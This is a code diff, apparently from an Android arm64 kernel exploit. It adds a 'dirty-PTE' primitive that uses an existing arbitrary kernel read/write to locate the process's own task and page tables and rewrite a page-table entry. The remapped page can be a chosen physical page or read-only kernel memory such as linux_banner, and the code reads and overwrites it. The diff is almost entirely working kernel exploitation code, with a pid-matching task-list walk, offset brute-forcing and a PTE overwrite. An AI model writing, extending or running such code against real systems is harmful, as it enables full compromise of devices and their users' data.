@@ -24,6 +24,40 @@ struct kgsl_map_user_mem {
 struct ion_allocation_data { uint64_t len; uint32_t heap_id_mask, flags, fd, unused; };
 #define ION_IOC_ALLOC_ _IOWR('I', 0, struct ion_allocation_data)
 
+/* --- dirty-PTE helper: map an arbitrary physical page into userspace --------
+ * arm64 (VA_BITS=39, 4K granule) = 3 levels: pgd[38:30] pmd[29:21] pte[20:12].
+ * Returns the PTE slot address and value for a user VA. */
+#define PTE_OA_MASK 0x0000FFFFFFFFF000ULL
+static int gl_pt_stage;
+/* Generic walk: lv=3 => shifts {30,21,12}; lv=4 => {39,30,21,12}.
+ * Returns the leaf descriptor slot/value; gl_pt_stage records the failure stage. */
+static int gl_pte_walk2(int fd, uintptr_t pgd, uintptr_t va, int lv, uint64_t ms,
+                        uintptr_t *slot, uint64_t *val) {
+  static const int sh4[4] = {39, 30, 21, 12};
+  static const int sh3[3] = {30, 21, 12};
+  const int *sh = (lv == 4) ? sh4 : sh3;
+  if (!ms) ms = 0x80000000ULL;
+  uintptr_t t = pgd;
+  gl_pt_stage = 0;
+  for (int k = 0; k < lv; k++) {
+    uint64_t d = 0;
+    size_t idx = (va >> sh[k]) & 0x1ff;
+    if (configfs_read_once(fd, t + idx * 8, &d, 8) != (ssize_t)8) { gl_pt_stage = 1; return 0; }
+    if (k == lv - 1) {
+      *slot = t + idx * 8; *val = d;
+      if ((d & 3) == 0) { gl_pt_stage = 2; return 0; }
+      return 1;
+    }
+    /* intermediate descriptor: table address is PHYSICAL -> convert to VA */
+    if ((d & 3) != 3) { gl_pt_stage = 2; return 0; }
+    uint64_t pa = d & PTE_OA_MASK;
+    uintptr_t nva = (uintptr_t)(pa - ms + (uint64_t)P0_PAGE_OFFSET);
+    if (!is_direct_ptr(nva)) { gl_pt_stage = 3; return 0; }
+    t = nva;
+  }
+  return 0;
+}
+
 static double fops_elapsed_ms(struct timespec *ref) {
   struct timespec now;
   clock_gettime(CLOCK_MONOTONIC, &now);
@@ -1364,6 +1398,150 @@ int try_cfi_stage(void) {
                   pr_info("kgsl_drm: restored victim\n"); fsync(1);
                 }
               }
+            }
+          }
+        }
+      }
+
+      /* PTEMAP=1: dirty-PTE primitive.  Remap a chosen physical page (or a
+       * kernel-in-image VA, given kimage_voffset) into userspace using our own
+       * arbitrary kernel R/W, so we can read/write pages the kernel maps RO
+       * (.text/.rodata) -> runtime ROM patching.  Discovery is verified by
+       * reading the linear-map alias of our own page (no speculative writes). */
+      {
+        const char *pme = getenv("PTEMAP");
+        if (pme && *pme) {
+          uint32_t me = (uint32_t)getpid();
+          uintptr_t head = data_addr(INIT_TASK_TASKS);
+          uintptr_t canon = canon_addr(INIT_TASK_TASKS);
+          uint64_t entry = 0; uintptr_t task = 0;
+          configfs_read_once(fd, head, &entry, sizeof entry);
+          for (int i = 0; i < 8192; i++) {
+            if (entry == (uint64_t)canon || entry == (uint64_t)head) break;
+            if (!is_direct_ptr(entry)) break;
+            uintptr_t t = (uintptr_t)entry - TASK_TASKS_OFF;
+            uint32_t pid = 0;
+            configfs_read_once(fd, t + TASK_PID_OFF, &pid, sizeof pid);
+            if (pid == me) { task = t; break; }
+            if (configfs_read_once(fd, t + TASK_TASKS_OFF, &entry, sizeof entry)
+                != (ssize_t)sizeof entry) break;
+          }
+          uint64_t ms = 0, kv = 0;
+          configfs_read_once(fd, data_addr(MEMSTART_ADDR), &ms, 8);
+          configfs_read_once(fd, data_addr(KIMAGE_VOFFSET), &kv, 8);
+          uintptr_t va1 = (uintptr_t)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
+                                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+          uintptr_t va2 = (uintptr_t)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
+                                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+          *(volatile uint64_t *)va1 = 0x1122334455667788ULL;   /* fault va1 in */
+          *(volatile uint64_t *)va2 = 0x99aabbccddeeff00ULL;   /* fault va2 in */
+          pr_info("ptemap: task=%016zx ms=%016zx kvoff=%016zx va1=%016zx va2=%016zx\n",
+                  (size_t)task, (size_t)ms, (size_t)kv, (size_t)va1, (size_t)va2);
+          fsync(1);
+          uintptr_t found_pgd = 0; uint32_t f_mm = 0, f_po = 0; uint64_t f_ms = 0; int f_lv = 3;
+          uintptr_t f_mmp = 0;
+          int n_mm = 0, n_pgd = 0, n_walk = 0; uint64_t first_oa = 0;
+          int st_hist[8] = {0};
+          uintptr_t dbg_pgd = 0; uint64_t dbg_d1 = 0;
+          if (is_direct_ptr(task)) {
+            static const uint64_t mscand[] = {0x80000000ULL, 0x40000000ULL,
+                                              0xC0000000ULL, 0x0ULL, 0x100000000ULL};
+            for (uintptr_t off = 0x200; off < 0x1200 && !found_pgd; off += 8) {
+              uint64_t mm = 0;
+              configfs_read_once(fd, task + off, &mm, 8);
+              if (!is_direct_ptr((uintptr_t)mm)) continue;
+              n_mm++;
+              for (uintptr_t poff = 0x08; poff <= 0x120 && !found_pgd; poff += 8) {
+                uint64_t pgd = 0;
+                configfs_read_once(fd, (uintptr_t)mm + poff, &pgd, 8);
+                if (!is_direct_ptr((uintptr_t)pgd) || (pgd & 0xfff)) continue;
+                n_pgd++;
+                for (int lv = 3; lv <= 4 && !found_pgd; lv++) {
+                  uintptr_t s1 = 0; uint64_t p1 = 0;
+                  if (!gl_pte_walk2(fd, pgd, va1, lv, ms, &s1, &p1)) {
+                    st_hist[gl_pt_stage]++;
+                    if (!dbg_pgd) {
+                      dbg_pgd = (uintptr_t)pgd;
+                      size_t di = (va1 >> ((lv == 4) ? 39 : 30)) & 0x1ff;
+                      configfs_read_once(fd, (uintptr_t)pgd + di * 8, &dbg_d1, 8);
+                    }
+                    continue;
+                  }
+                  if ((p1 & 3) != 3) continue;
+                  n_walk++;
+                  uint64_t oa1 = p1 & PTE_OA_MASK;
+                  if (!oa1) continue;
+                  if (!first_oa) first_oa = p1;
+                  for (size_t ci = 0; ci < sizeof(mscand) / sizeof(mscand[0]); ci++) {
+                    uintptr_t ka = (uintptr_t)(oa1 - mscand[ci]) + (uintptr_t)P0_PAGE_OFFSET;
+                    if (!is_direct_ptr(ka)) continue;
+                    uint64_t probe = 0;
+                    if (configfs_read_once(fd, ka, &probe, 8) != (ssize_t)8) continue;
+                    if (probe == 0x1122334455667788ULL) {
+                      found_pgd = (uintptr_t)pgd; f_mm = (uint32_t)off;
+                      f_po = (uint32_t)poff; f_ms = mscand[ci]; f_lv = lv;
+                      f_mmp = (uintptr_t)mm;
+                      break;
+                    }
+                  }
+                }
+              }
+            }
+          }
+          if (!found_pgd) {
+            pr_info("ptemap: mm/pgd NOT found (n_mm=%d n_pgd=%d n_walk=%d first_pte=%016zx)\n",
+                    n_mm, n_pgd, n_walk, (size_t)first_oa);
+            pr_info("ptemap: stage hist 1..7 = %d %d %d %d %d %d %d; dbg pgd=%016zx d1=%016zx\n",
+                    st_hist[1], st_hist[2], st_hist[3], st_hist[4], st_hist[5],
+                    st_hist[6], st_hist[7], (size_t)dbg_pgd, (size_t)dbg_d1);
+            fsync(1);
+          } else {
+            pr_info("ptemap: FOUND mm_off=%03x pgd_off=%02x mm=%016zx pgd=%016zx ms=%016zx lv=%d\n",
+                    f_mm, f_po, (size_t)f_mmp, (size_t)found_pgd, (size_t)f_ms, f_lv);
+            fsync(1);
+            /* Target: "banner" -> linux_banner (.rodata); otherwise numeric
+             * (kernel-image VA if >= 0xffffff8000000000, else a raw physical). */
+            uint64_t target_va = 0, arg = strtoull(pme, NULL, 0);
+            if (pme[0] == 'b') target_va = (uint64_t)data_addr(LINUX_BANNER);
+            else if (arg >= 0xffffff8000000000ULL) target_va = arg;
+            uint64_t phys = target_va ? (target_va - kv) : arg;
+            size_t off = target_va ? (size_t)(target_va & 0xfff) : 0;
+            phys &= ~0xfffULL;
+            uintptr_t s2 = 0; uint64_t p2 = 0;
+            if (phys && gl_pte_walk2(fd, found_pgd, va2, f_lv, ms, &s2, &p2)) {
+              uint64_t pte = (p2 & ~PTE_OA_MASK) | (phys & PTE_OA_MASK);
+              mprotect((void *)va2, 0x1000, PROT_NONE);   /* flush TLB for va2 */
+              configfs_write_once(fd, s2, &pte, 8);
+              pr_info("ptemap: va=%016zx phys=%016zx pte=%016zx off=%zx\n",
+                      (size_t)target_va, (size_t)phys, (size_t)pte, off);
+              fsync(1);
+              uint8_t b[32];
+              for (int i = 0; i < 32; i++) b[i] = ((volatile uint8_t *)va2)[off + i];
+              pr_info("ptemap: read =");
+              for (int i = 0; i < 32; i++) pr_info(" %02x", b[i]);
+              pr_info("  |");
+              for (int i = 0; i < 32; i++)
+                pr_info("%c", (b[i] >= 0x20 && b[i] < 0x7f) ? b[i] : '.');
+              pr_info("|\n");
+              fsync(1);
+              const char *pw = getenv("PTEWRITE");
+              if (pw && *pw) {
+                volatile uint8_t *p = (volatile uint8_t *)va2 + off;
+                uint8_t nv = (uint8_t)strtoul(pw, NULL, 0), ov = *p;
+                *p = nv;
+                uint8_t rb = *p, kb = 0;
+                uint64_t la = (phys + off) - ms + (uint64_t)P0_PAGE_OFFSET;
+                configfs_read_once(fd, (uintptr_t)la, &kb, 1);
+                pr_info("ptemap: WRITE off=%zx %02x->%02x readback=%02x kernalias=%02x\n",
+                        off, ov, nv, rb, kb);
+                fsync(1);
+              }
+              /* CRITICAL: restore va2's original PTE.  Leaving a crafted PTE in
+               * place makes zap_pte_range() at process exit put_page() a page we
+               * do not own -> refcount corruption / hard hang (not a panic). */
+              configfs_write_once(fd, s2, &p2, 8);
+              pr_info("ptemap: PTE restored\n");
+              fsync(1);
             }
           }
         }
